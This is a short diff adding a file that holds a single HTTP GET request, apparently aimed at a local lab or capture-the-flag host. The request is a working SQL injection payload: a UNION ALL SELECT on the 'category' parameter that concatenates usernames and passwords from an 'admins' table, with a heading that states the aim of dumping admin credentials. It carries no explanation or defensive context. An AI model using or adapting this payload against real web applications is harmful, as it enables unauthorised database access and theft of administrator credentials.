@@ -1,0 +1,4 @@
+# SQL injection in category parameter using UNION query to dump admin credentials from admins table
+
+GET /?category=Tech' UNION ALL SELECT NULL,CONCAT(username,0x3a,password),NULL,NULL,NULL,NULL,NULL FROM admins-- - HTTP/1.1
+Host: 172.17.0.1:57383
